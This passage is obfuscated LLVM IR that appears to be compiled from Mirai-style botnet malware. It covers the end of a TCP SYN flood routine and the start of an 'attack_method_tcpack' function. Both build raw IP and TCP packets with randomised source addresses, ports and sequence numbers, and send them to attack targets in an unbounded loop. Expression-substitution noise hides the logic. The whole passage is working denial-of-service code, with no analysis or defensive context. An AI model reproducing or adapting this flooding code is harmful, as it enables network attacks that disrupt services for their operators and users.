  %136 = xor i8 -116, -1
  %137 = or i8 %134, %135
  %138 = or i8 -116, %136
  %139 = xor i8 %137, -1
  %140 = and i8 %139, %138
  %141 = and i8 %133, 15
  %142 = xor i8 %140, -1
  %143 = xor i8 64, -1
  %144 = xor i8 51, -1
  %145 = and i8 %142, 51
  %146 = and i8 %140, %144
  %147 = and i8 %143, 51
  %148 = and i8 64, %144
  %149 = or i8 %145, %146
  %150 = or i8 %147, %148
  %151 = xor i8 %149, %150
  %152 = or i8 %142, %143
  %153 = xor i8 %152, -1
  %154 = or i8 51, %144
  %155 = and i8 %153, %154
  %156 = or i8 %151, %155
  %157 = or i8 %140, 64
  store i8 %156, i8* %132, align 4
  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = bitcast %struct.iphdr* %158 to i8*
  %160 = load i8, i8* %159, align 4
  %161 = xor i8 -16, -1
  %162 = xor i8 %160, %161
  %163 = and i8 %162, %160
  %164 = and i8 %160, -16
  %165 = and i8 %163, 5
  %166 = xor i8 %163, 5
  %167 = or i8 %165, %166
  %168 = or i8 %163, 5
  store i8 %167, i8* %159, align 4
  %169 = load i8, i8* %12, align 1
  %170 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 1
  store i8 %169, i8* %171, align 1
  %172 = call zeroext i16 @htons(i16 zeroext 60) #7
  %173 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 2
  store i16 %172, i16* %174, align 2
  %175 = load i16, i16* %13, align 2
  %176 = call zeroext i16 @htons(i16 zeroext %175) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 3
  store i16 %176, i16* %178, align 4
  %179 = load i8, i8* %14, align 1
  %180 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 5
  store i8 %179, i8* %181, align 4
  %182 = load i8, i8* %15, align 1
  %183 = icmp ne i8 %182, 0
  br i1 %183, label %184, label %188

; <label>:184:                                    ; preds = %113
  %185 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %186 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 4
  store i16 %185, i16* %187, align 2
  br label %188

; <label>:188:                                    ; preds = %184, %113
  %189 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 6
  store i8 6, i8* %190, align 1
  %191 = load i32, i32* %26, align 4
  %192 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 8
  store i32 %191, i32* %193, align 4
  %194 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %195 = load i32, i32* %9, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i64 %196
  %198 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i32 0, i32 1
  %199 = load i32, i32* %198, align 4
  %200 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 9
  store i32 %199, i32* %201, align 4
  %202 = load i16, i16* %16, align 2
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 0
  store i16 %203, i16* %205, align 4
  %206 = load i16, i16* %17, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 1
  store i16 %207, i16* %209, align 2
  %210 = load i32, i32* %18, align 4
  %211 = trunc i32 %210 to i16
  %212 = call zeroext i16 @htons(i16 zeroext %211) #7
  %213 = zext i16 %212 to i32
  %214 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 2
  store i32 %213, i32* %215, align 4
  %216 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = xor i16 -241, -1
  %220 = xor i16 %218, %219
  %221 = and i16 %220, %218
  %222 = and i16 %218, -241
  %223 = xor i16 %221, -1
  %224 = xor i16 160, -1
  %225 = xor i16 -14689, -1
  %226 = and i16 %223, -14689
  %227 = and i16 %221, %225
  %228 = and i16 %224, -14689
  %229 = and i16 160, %225
  %230 = or i16 %226, %227
  %231 = or i16 %228, %229
  %232 = xor i16 %230, %231
  %233 = or i16 %223, %224
  %234 = xor i16 %233, -1
  %235 = or i16 -14689, %225
  %236 = and i16 %234, %235
  %237 = or i16 %232, %236
  %238 = or i16 %221, 160
  store i16 %237, i16* %217, align 4
  %239 = load i8, i8* %20, align 1
  %240 = sext i8 %239 to i16
  %241 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 4
  %243 = load i16, i16* %242, align 4
  %244 = xor i16 1, -1
  %245 = xor i16 %240, %244
  %246 = and i16 %245, %240
  %247 = and i16 %240, 1
  %248 = shl i16 %246, 13
  %249 = xor i16 -8193, -1
  %250 = xor i16 %243, %249
  %251 = and i16 %250, %243
  %252 = and i16 %243, -8193
  %253 = and i16 %251, %248
  %254 = xor i16 %251, %248
  %255 = or i16 %253, %254
  %256 = or i16 %251, %248
  store i16 %255, i16* %242, align 4
  %257 = load i8, i8* %21, align 1
  %258 = sext i8 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 4
  %261 = load i16, i16* %260, align 4
  %262 = xor i16 1, -1
  %263 = xor i16 %258, %262
  %264 = and i16 %263, %258
  %265 = and i16 %258, 1
  %266 = shl i16 %264, 12
  %267 = xor i16 -4097, -1
  %268 = xor i16 %261, %267
  %269 = and i16 %268, %261
  %270 = and i16 %261, -4097
  %271 = xor i16 %269, -1
  %272 = xor i16 %266, -1
  %273 = xor i16 -28245, -1
  %274 = and i16 %271, -28245
  %275 = and i16 %269, %273
  %276 = and i16 %272, -28245
  %277 = and i16 %266, %273
  %278 = or i16 %274, %275
  %279 = or i16 %276, %277
  %280 = xor i16 %278, %279
  %281 = or i16 %271, %272
  %282 = xor i16 %281, -1
  %283 = or i16 -28245, %273
  %284 = and i16 %282, %283
  %285 = or i16 %280, %284
  %286 = or i16 %269, %266
  store i16 %285, i16* %260, align 4
  %287 = load i8, i8* %22, align 1
  %288 = sext i8 %287 to i16
  %289 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %290 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %289, i32 0, i32 4
  %291 = load i16, i16* %290, align 4
  %292 = xor i16 %288, -1
  %293 = xor i16 1, -1
  %294 = xor i16 -32752, -1
  %295 = or i16 %292, %293
  %296 = or i16 -32752, %294
  %297 = xor i16 %295, -1
  %298 = and i16 %297, %296
  %299 = and i16 %288, 1
  %300 = shl i16 %298, 11
  %301 = xor i16 %291, -1
  %302 = xor i16 -2049, -1
  %303 = xor i16 -23548, -1
  %304 = or i16 %301, %302
  %305 = or i16 -23548, %303
  %306 = xor i16 %304, -1
  %307 = and i16 %306, %305
  %308 = and i16 %291, -2049
  %309 = xor i16 %307, -1
  %310 = xor i16 %300, -1
  %311 = xor i16 -7537, -1
  %312 = and i16 %309, -7537
  %313 = and i16 %307, %311
  %314 = and i16 %310, -7537
  %315 = and i16 %300, %311
  %316 = or i16 %312, %313
  %317 = or i16 %314, %315
  %318 = xor i16 %316, %317
  %319 = or i16 %309, %310
  %320 = xor i16 %319, -1
  %321 = or i16 -7537, %311
  %322 = and i16 %320, %321
  %323 = or i16 %318, %322
  %324 = or i16 %307, %300
  store i16 %323, i16* %290, align 4
  %325 = load i8, i8* %23, align 1
  %326 = sext i8 %325 to i16
  %327 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %328 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %327, i32 0, i32 4
  %329 = load i16, i16* %328, align 4
  %330 = xor i16 %326, -1
  %331 = xor i16 1, -1
  %332 = xor i16 8030, -1
  %333 = or i16 %330, %331
  %334 = or i16 8030, %332
  %335 = xor i16 %333, -1
  %336 = and i16 %335, %334
  %337 = and i16 %326, 1
  %338 = shl i16 %336, 10
  %339 = xor i16 -1025, -1
  %340 = xor i16 %329, %339
  %341 = and i16 %340, %329
  %342 = and i16 %329, -1025
  %343 = and i16 %341, %338
  %344 = xor i16 %341, %338
  %345 = or i16 %343, %344
  %346 = or i16 %341, %338
  store i16 %345, i16* %328, align 4
  %347 = load i8, i8* %24, align 1
  %348 = sext i8 %347 to i16
  %349 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %350 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %349, i32 0, i32 4
  %351 = load i16, i16* %350, align 4
  %352 = xor i16 1, -1
  %353 = xor i16 %348, %352
  %354 = and i16 %353, %348
  %355 = and i16 %348, 1
  %356 = shl i16 %354, 9
  %357 = xor i16 -513, -1
  %358 = xor i16 %351, %357
  %359 = and i16 %358, %351
  %360 = and i16 %351, -513
  %361 = and i16 %359, %356
  %362 = xor i16 %359, %356
  %363 = or i16 %361, %362
  %364 = or i16 %359, %356
  store i16 %363, i16* %350, align 4
  %365 = load i8, i8* %25, align 1
  %366 = sext i8 %365 to i16
  %367 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %368 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %367, i32 0, i32 4
  %369 = load i16, i16* %368, align 4
  %370 = xor i16 %366, -1
  %371 = xor i16 1, -1
  %372 = xor i16 24943, -1
  %373 = or i16 %370, %371
  %374 = or i16 24943, %372
  %375 = xor i16 %373, -1
  %376 = and i16 %375, %374
  %377 = and i16 %366, 1
  %378 = shl i16 %376, 8
  %379 = xor i16 %369, -1
  %380 = xor i16 -257, -1
  %381 = xor i16 -2417, -1
  %382 = or i16 %379, %380
  %383 = or i16 -2417, %381
  %384 = xor i16 %382, -1
  %385 = and i16 %384, %383
  %386 = and i16 %369, -257
  %387 = xor i16 %385, -1
  %388 = xor i16 %378, -1
  %389 = xor i16 -28467, -1
  %390 = and i16 %387, -28467
  %391 = and i16 %385, %389
  %392 = and i16 %388, -28467
  %393 = and i16 %378, %389
  %394 = or i16 %390, %391
  %395 = or i16 %392, %393
  %396 = xor i16 %394, %395
  %397 = or i16 %387, %388
  %398 = xor i16 %397, -1
  %399 = or i16 -28467, %389
  %400 = and i16 %398, %399
  %401 = or i16 %396, %400
  %402 = or i16 %385, %378
  store i16 %401, i16* %368, align 4
  %403 = load i8*, i8** %29, align 8
  %404 = getelementptr inbounds i8, i8* %403, i32 1
  store i8* %404, i8** %29, align 8
  store i8 2, i8* %403, align 1
  %405 = load i8*, i8** %29, align 8
  %406 = getelementptr inbounds i8, i8* %405, i32 1
  store i8* %406, i8** %29, align 8
  store i8 4, i8* %405, align 1
  %407 = call i32 @rand_next()
  %408 = xor i32 15, -1
  %409 = xor i32 %407, %408
  %410 = and i32 %409, %407
  %411 = and i32 %407, 15
  %412 = sub i32 1400, 683127121
  %413 = add i32 %412, %410
  %414 = add i32 %413, 683127121
  %415 = add i32 1400, %410
  %416 = trunc i32 %414 to i16
  %417 = call zeroext i16 @htons(i16 zeroext %416) #7
  %418 = load i8*, i8** %29, align 8
  %419 = bitcast i8* %418 to i16*
  store i16 %417, i16* %419, align 2
  %420 = load i8*, i8** %29, align 8
  %421 = getelementptr inbounds i8, i8* %420, i64 2
  store i8* %421, i8** %29, align 8
  %422 = load i8*, i8** %29, align 8
  %423 = getelementptr inbounds i8, i8* %422, i32 1
  store i8* %423, i8** %29, align 8
  store i8 4, i8* %422, align 1
  %424 = load i8*, i8** %29, align 8
  %425 = getelementptr inbounds i8, i8* %424, i32 1
  store i8* %425, i8** %29, align 8
  store i8 2, i8* %424, align 1
  %426 = load i8*, i8** %29, align 8
  %427 = getelementptr inbounds i8, i8* %426, i32 1
  store i8* %427, i8** %29, align 8
  store i8 8, i8* %426, align 1
  %428 = load i8*, i8** %29, align 8
  %429 = getelementptr inbounds i8, i8* %428, i32 1
  store i8* %429, i8** %29, align 8
  store i8 10, i8* %428, align 1
  %430 = call i32 @rand_next()
  %431 = load i8*, i8** %29, align 8
  %432 = bitcast i8* %431 to i32*
  store i32 %430, i32* %432, align 4
  %433 = load i8*, i8** %29, align 8
  %434 = getelementptr inbounds i8, i8* %433, i64 4
  store i8* %434, i8** %29, align 8
  %435 = load i8*, i8** %29, align 8
  %436 = bitcast i8* %435 to i32*
  store i32 0, i32* %436, align 4
  %437 = load i8*, i8** %29, align 8
  %438 = getelementptr inbounds i8, i8* %437, i64 4
  store i8* %438, i8** %29, align 8
  %439 = load i8*, i8** %29, align 8
  %440 = getelementptr inbounds i8, i8* %439, i32 1
  store i8* %440, i8** %29, align 8
  store i8 1, i8* %439, align 1
  %441 = load i8*, i8** %29, align 8
  %442 = getelementptr inbounds i8, i8* %441, i32 1
  store i8* %442, i8** %29, align 8
  store i8 3, i8* %441, align 1
  %443 = load i8*, i8** %29, align 8
  %444 = getelementptr inbounds i8, i8* %443, i32 1
  store i8* %444, i8** %29, align 8
  store i8 3, i8* %443, align 1
  %445 = load i8*, i8** %29, align 8
  %446 = getelementptr inbounds i8, i8* %445, i32 1
  store i8* %446, i8** %29, align 8
  store i8 6, i8* %445, align 1
  br label %447

; <label>:447:                                    ; preds = %188
  %448 = load i32, i32* %9, align 4
  %449 = sub i32 0, 1
  %450 = sub i32 %448, %449
  %451 = add nsw i32 %448, 1
  store i32 %450, i32* %9, align 4
  br label %108

; <label>:452:                                    ; preds = %108
  br label %453

; <label>:453:                                    ; preds = %635, %452
  store i32 0, i32* %9, align 4
  br label %454

; <label>:454:                                    ; preds = %628, %453
  %455 = load i32, i32* %9, align 4
  %456 = load i8, i8* %5, align 1
  %457 = zext i8 %456 to i32
  %458 = icmp slt i32 %455, %457
  br i1 %458, label %459, label %635

; <label>:459:                                    ; preds = %454
  %460 = load i8**, i8*** %11, align 8
  %461 = load i32, i32* %9, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds i8*, i8** %460, i64 %462
  %464 = load i8*, i8** %463, align 8
  store i8* %464, i8** %30, align 8
  %465 = load i8*, i8** %30, align 8
  %466 = bitcast i8* %465 to %struct.iphdr*
  store %struct.iphdr* %466, %struct.iphdr** %31, align 8
  %467 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i64 1
  %469 = bitcast %struct.iphdr* %468 to %struct.tcphdr*
  store %struct.tcphdr* %469, %struct.tcphdr** %32, align 8
  %470 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %471 = load i32, i32* %9, align 4
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %470, i64 %472
  %474 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %473, i32 0, i32 2
  %475 = load i8, i8* %474, align 4
  %476 = zext i8 %475 to i32
  %477 = icmp slt i32 %476, 32
  br i1 %477, label %478, label %502

; <label>:478:                                    ; preds = %459
  %479 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %480 = load i32, i32* %9, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %479, i64 %481
  %483 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %482, i32 0, i32 1
  %484 = load i32, i32* %483, align 4
  %485 = call i32 @ntohl(i32 %484) #7
  %486 = call i32 @rand_next()
  %487 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %488 = load i32, i32* %9, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %487, i64 %489
  %491 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %490, i32 0, i32 2
  %492 = load i8, i8* %491, align 4
  %493 = zext i8 %492 to i32
  %494 = lshr i32 %486, %493
  %495 = add i32 %485, 850383740
  %496 = add i32 %495, %494
  %497 = sub i32 %496, 850383740
  %498 = add i32 %485, %494
  %499 = call i32 @htonl(i32 %497) #7
  %500 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %501 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %500, i32 0, i32 9
  store i32 %499, i32* %501, align 4
  br label %502

; <label>:502:                                    ; preds = %478, %459
  %503 = load i32, i32* %26, align 4
  %504 = icmp eq i32 %503, -1
  br i1 %504, label %505, label %509

; <label>:505:                                    ; preds = %502
  %506 = call i32 @rand_next()
  %507 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %508 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %507, i32 0, i32 8
  store i32 %506, i32* %508, align 4
  br label %509

; <label>:509:                                    ; preds = %505, %502
  %510 = load i16, i16* %13, align 2
  %511 = zext i16 %510 to i32
  %512 = icmp eq i32 %511, 65535
  br i1 %512, label %513, label %526

; <label>:513:                                    ; preds = %509
  %514 = call i32 @rand_next()
  %515 = xor i32 %514, -1
  %516 = xor i32 65535, -1
  %517 = xor i32 -276612943, -1
  %518 = or i32 %515, %516
  %519 = or i32 -276612943, %517
  %520 = xor i32 %518, -1
  %521 = and i32 %520, %519
  %522 = and i32 %514, 65535
  %523 = trunc i32 %521 to i16
  %524 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %525 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %524, i32 0, i32 3
  store i16 %523, i16* %525, align 4
  br label %526

; <label>:526:                                    ; preds = %513, %509
  %527 = load i16, i16* %16, align 2
  %528 = zext i16 %527 to i32
  %529 = icmp eq i32 %528, 65535
  br i1 %529, label %530, label %543

; <label>:530:                                    ; preds = %526
  %531 = call i32 @rand_next()
  %532 = xor i32 %531, -1
  %533 = xor i32 65535, -1
  %534 = xor i32 -1762440040, -1
  %535 = or i32 %532, %533
  %536 = or i32 -1762440040, %534
  %537 = xor i32 %535, -1
  %538 = and i32 %537, %536
  %539 = and i32 %531, 65535
  %540 = trunc i32 %538 to i16
  %541 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %542 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %541, i32 0, i32 0
  store i16 %540, i16* %542, align 4
  br label %543

; <label>:543:                                    ; preds = %530, %526
  %544 = load i16, i16* %17, align 2
  %545 = zext i16 %544 to i32
  %546 = icmp eq i32 %545, 65535
  br i1 %546, label %547, label %560

; <label>:547:                                    ; preds = %543
  %548 = call i32 @rand_next()
  %549 = xor i32 %548, -1
  %550 = xor i32 65535, -1
  %551 = xor i32 -1561301973, -1
  %552 = or i32 %549, %550
  %553 = or i32 -1561301973, %551
  %554 = xor i32 %552, -1
  %555 = and i32 %554, %553
  %556 = and i32 %548, 65535
  %557 = trunc i32 %555 to i16
  %558 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %559 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %558, i32 0, i32 1
  store i16 %557, i16* %559, align 2
  br label %560

; <label>:560:                                    ; preds = %547, %543
  %561 = load i32, i32* %18, align 4
  %562 = icmp eq i32 %561, 65535
  br i1 %562, label %563, label %567

; <label>:563:                                    ; preds = %560
  %564 = call i32 @rand_next()
  %565 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %566 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %565, i32 0, i32 2
  store i32 %564, i32* %566, align 4
  br label %567

; <label>:567:                                    ; preds = %563, %560
  %568 = load i32, i32* %19, align 4
  %569 = icmp eq i32 %568, 65535
  br i1 %569, label %570, label %574

; <label>:570:                                    ; preds = %567
  %571 = call i32 @rand_next()
  %572 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %573 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %572, i32 0, i32 3
  store i32 %571, i32* %573, align 4
  br label %574

; <label>:574:                                    ; preds = %570, %567
  %575 = load i8, i8* %20, align 1
  %576 = icmp ne i8 %575, 0
  br i1 %576, label %577, label %590

; <label>:577:                                    ; preds = %574
  %578 = call i32 @rand_next()
  %579 = xor i32 %578, -1
  %580 = xor i32 65535, -1
  %581 = xor i32 -1319023397, -1
  %582 = or i32 %579, %580
  %583 = or i32 -1319023397, %581
  %584 = xor i32 %582, -1
  %585 = and i32 %584, %583
  %586 = and i32 %578, 65535
  %587 = trunc i32 %585 to i16
  %588 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %589 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %588, i32 0, i32 7
  store i16 %587, i16* %589, align 2
  br label %590

; <label>:590:                                    ; preds = %577, %574
  %591 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %592 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %591, i32 0, i32 7
  store i16 0, i16* %592, align 2
  %593 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %594 = bitcast %struct.iphdr* %593 to i16*
  %595 = call zeroext i16 @checksum_generic(i16* %594, i32 20)
  %596 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %597 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %596, i32 0, i32 7
  store i16 %595, i16* %597, align 2
  %598 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 6
  store i16 0, i16* %599, align 4
  %600 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %601 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %602 = bitcast %struct.tcphdr* %601 to i8*
  %603 = call zeroext i16 @htons(i16 zeroext 40) #7
  %604 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %600, i8* %602, i16 zeroext %603, i32 40)
  %605 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %606 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %605, i32 0, i32 6
  store i16 %604, i16* %606, align 4
  %607 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %608 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %607, i32 0, i32 1
  %609 = load i16, i16* %608, align 2
  %610 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %611 = load i32, i32* %9, align 4
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %610, i64 %612
  %614 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %613, i32 0, i32 0
  %615 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %614, i32 0, i32 1
  store i16 %609, i16* %615, align 2
  %616 = load i32, i32* %10, align 4
  %617 = load i8*, i8** %30, align 8
  %618 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %619 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %620 = load i32, i32* %9, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %619, i64 %621
  %623 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %622, i32 0, i32 0
  %624 = bitcast %struct.sockaddr_in* %623 to %struct.sockaddr*
  store %struct.sockaddr* %624, %struct.sockaddr** %618, align 8
  %625 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %626 = load %struct.sockaddr*, %struct.sockaddr** %625, align 8
  %627 = call i64 @sendto(i32 %616, i8* %617, i64 60, i32 16384, %struct.sockaddr* %626, i32 16)
  br label %628

; <label>:628:                                    ; preds = %590
  %629 = load i32, i32* %9, align 4
  %630 = sub i32 0, %629
  %631 = sub i32 0, 1
  %632 = add i32 %630, %631
  %633 = sub i32 0, %632
  %634 = add nsw i32 %629, 1
  store i32 %633, i32* %9, align 4
  br label %454

; <label>:635:                                    ; preds = %454
  br label %453

; <label>:636:                                    ; preds = %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
